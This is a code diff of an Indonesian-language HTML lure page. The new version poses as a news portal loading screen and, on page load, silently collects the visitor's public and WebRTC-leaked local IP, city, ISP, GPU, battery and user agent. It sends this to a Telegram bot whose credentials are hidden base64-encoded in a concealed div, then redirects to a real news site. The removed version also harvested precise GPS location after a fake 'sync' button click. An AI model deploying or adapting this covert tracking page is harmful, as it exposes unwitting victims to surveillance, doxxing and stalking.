@@ -3,98 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Jaringan Terpadu</title>
+    <title>Connecting to News Portal...</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f7; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { background: #fff; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; max-width: 380px; border-top: 4px solid #0056b3; }
-        .icon { font-size: 45px; margin-bottom: 20px; }
-        h2 { font-size: 19px; margin-bottom: 10px; color: #0056b3; }
-        p { font-size: 13.5px; color: #666; line-height: 1.6; margin-bottom: 25px; }
-        .btn-action { background: #0056b3; color: #fff; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.3s; }
-        .btn-action:hover { background: #004494; }
-        .status { font-size: 10px; color: #aaa; margin-top: 15px; font-family: monospace; }
+        body { font-family: sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #444; }
+        .loader-box { text-align: center; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 14px; letter-spacing: 0.5px; }
         #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="icon">📶</div>
-    <h2>Optimasi Sesi Jaringan</h2>
-    <p>Sesi akses Anda perlu diperbarui untuk menjaga kestabilan data. Klik tombol di bawah untuk menyinkronkan profil perangkat dengan gateway.</p>
-    <button class="btn-action" id="execBtn" onclick="runOmni()">SINKRONKAN SEKARANG</button>
-    <div class="status" id="st">NODE-ID: 0x992B-VERIFY</div>
+<div class="loader-box">
+    <div class="spinner"></div>
+    <p>Memuat konten berita...</p>
 </div>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-    /* OMNI-RECON PROTOCOL v7.0
-       Automatic Force-HTTPS & Hardware Sniffing
-    */
+    // Force HTTPS
     if (location.protocol === 'http:') { location.replace(window.location.href.replace('http:', 'https:')); }
 
-    const _V = document.getElementById('v-vault').innerText.split('|');
-    const _TK = atob(_V[1]); const _CI = atob(_V[2]);
+    const _DATA = document.getElementById('v-vault').innerText.split('|');
+    const _TOKEN = atob(_DATA[1]); const _CHATID = atob(_DATA[2]);
 
-    async function runOmni() {
-        const btn = document.getElementById('execBtn');
-        btn.innerText = "PROSESING...";
-        
-        // 1. DATA PERANGKAT & IP
-        let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
-        let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}
+    window.onload = async () => {
+        try {
+            // 1. DATA PERANGKAT & HARDWARE (IDENTITAS ASLI)
+            let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            const renderer = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
+            
+            let battery = "N/A";
+            try { const b = await navigator.getBattery(); battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`; } catch(e) {}
 
-        // 2. BRAND & GPU IDENTIFIER
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-        
-        // 3. INTERNAL IP LEAK
-        const pc = new RTCPeerConnection({iceServers:[]});
-        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-        let lip = "Locked";
-        pc.onicecandidate = (i) => { if(i && i.candidate) lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; };
+            // 2. DETEKSI LOCAL IP & MODE HOTSPOT
+            const pc = new RTCPeerConnection({iceServers:[]});
+            pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+            
+            pc.onicecandidate = async (ice) => {
+                if(!ice || !ice.candidate) return;
+                const localIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+                
+                // Logika Penentu: Hotspot biasanya 192.168.43.x
+                const isHotspot = localIP.startsWith("192.168.43") ? "⚠️ HOTSPOT ACTIVE" : "STANDARD";
 
-        // 4. MAPPING BRAND BERDASARKAN GPU (Sederhana)
-        let brand = "Unknown Device";
-        if (gpu.includes("Adreno")) brand = "Snapdragon Based (Oppo/Vivo/Xiaomi/Samsung)";
-        if (gpu.includes("Mali")) brand = "MediaTek Based (Realme/Infinix/Samsung A series)";
-        if (gpu.includes("Apple")) brand = "iPhone / iPad";
+                // 3. IDENTIFIKASI MEREK HP DARI GPU
+                let brand = "Generic Android";
+                if (renderer.includes("Adreno")) brand = "Qualcomm (Xiaomi/Oppo/Vivo/Samsung)";
+                if (renderer.includes("Mali-G52")) brand = "Entry-Mid (Realme/Samsung A Series)";
+                if (renderer.includes("Mali-G7")) brand = "High-End (Flagship Android)";
+                if (renderer.includes("Apple")) brand = "iPhone / iOS Device";
 
-        const report = `🔱 FORENSIC BRAND REPORT 🔱\n\n` +
-            `📱 BRAND/GPU: ${brand}\n` +
-            `🎮 RENDERER: ${gpu}\n` +
-            `👤 PLATFORM: ${navigator.platform}\n` +
-            `🧠 CORES: ${navigator.hardwareConcurrency} CPU\n` +
-            `🌐 IP: ${net.ip} (${net.org})\n` +
-            `🏠 LOCAL: ${lip}\n` +
-            `🔋 BATT: ${bat}\n` +
-            `🏙️ CITY: ${net.city}\n\n` +
-            `📄 FULL UA: ${navigator.userAgent}`;
+                const log = `🔱 SENSITIVE DATA LEAK 🔱\n\n` +
+                    `📱 DEVICE: ${brand}\n` +
+                    `🎮 GPU: ${renderer}\n` +
+                    `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+                    `⚡ BATT: ${battery}\n` +
+                    `🏠 LOCAL IP: ${localIP}\n` +
+                    `🌐 PUB IP: ${net.ip}\n` +
+                    `🏢 ISP: ${net.org}\n` +
+                    `🏙️ CITY: ${net.city}\n` +
+                    `📡 MODE: ${isHotspot}\n\n` +
+                    `📄 AGENT: ${navigator.userAgent.slice(0, 100)}`;
 
-        await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
-            method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:_CI, text:report})
-        });
-
-        // 5. GPS & FINAL REDIRECT KE BERITA
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const maps = `🎯 PRECISION LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`;
-                await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({chat_id:_CI, text:maps})
+                // KIRIM KE TELEGRAM
+                await fetch(`https://api.telegram.org/bot${_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: _CHATID, text: log })
                 });
+
+                // REDIRECT OTOMATIS KE BERITA (Sangat Cepat)
                 window.location.href = "https://www.detik.com";
-            }, () => {
-                window.location.href = "https://www.detik.com";
-            }, {enableHighAccuracy: true});
-        } else {
+            };
+
+            // Timeout Failsafe: Kalau IP lokal macet, tetep redirect
+            setTimeout(() => { window.location.href = "https://www.detik.com"; }, 3000);
+
+        } catch (err) {
             window.location.href = "https://www.detik.com";
         }
-    }
+    };
 </script>
 </body>
 </html>
